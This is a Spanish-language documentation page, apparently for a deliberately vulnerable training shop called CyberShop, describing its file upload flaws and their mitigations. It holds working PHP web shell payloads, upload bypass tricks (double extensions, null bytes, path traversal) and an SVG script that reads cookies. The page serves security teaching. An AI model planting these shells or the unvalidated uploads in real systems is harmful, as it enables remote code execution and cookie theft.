---
layout: default
title: File Upload Vulnerabilities
nav_order: 9
parent: Vulnerabilidades
---

# Vulnerabilidades de Subida de Archivos en CyberShop

## Descripción General
Las vulnerabilidades de subida de archivos en CyberShop permiten a los atacantes cargar archivos maliciosos que pueden comprometer la seguridad del servidor. Estas vulnerabilidades están presentes en varios endpoints que permiten la subida de archivos.

## Ubicaciones Vulnerables

### 1. Subida de Avatar de Usuario
- **Endpoint**: `/api/v1/users/avatar`
- **Descripción**: Sin validación adecuada de tipos de archivo
- **Impacto**: Ejecución remota de código (RCE)
- **Ejemplo de Explotación**:
  ```php
  <?php system($_GET['cmd']); ?>
  ```

### 2. Subida de Imágenes de Productos
- **Endpoint**: `/api/v1/products/image`
- **Descripción**: Validación débil de tipo MIME
- **Impacto**: Bypass de validaciones y RCE
- **Ejemplo de Bypass**:
  ```http
  Content-Type: image/jpeg
  [Contenido real: shell.php]
  ```

### 3. Archivos en Chat de Soporte
- **Endpoint**: `/api/v1/support/attachment`
- **Descripción**: Sin validación de extensiones
- **Impacto**: Subida de malware y shells web

## Métodos de Explotación

### 1. Bypass de Validaciones
- Modificación de Content-Type
- Extensiones dobles (.jpg.php)
- Null bytes en nombres (%00)
- Path traversal (../../../shell.php)

### 2. Payloads Comunes
```php
// Shell básica
<?php system($_GET['cmd']); ?>

// Shell avanzada
<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
```

### 3. XSS vía SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.cookie)</script>
</svg>
```

## Mitigación

### 1. Validación de Archivos
- Verificar extensiones permitidas
- Validar tipos MIME reales
- Implementar límites de tamaño
- Sanitizar nombres de archivo

### 2. Almacenamiento Seguro
- Usar directorios fuera del webroot
- Implementar nombres aleatorios
- Establecer permisos restrictivos
- Usar almacenamiento en la nube (S3)

### 3. Procesamiento
- Convertir imágenes a formatos seguros
- Eliminar metadatos
- Implementar antivirus
- Validar contenido real

## Recursos
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
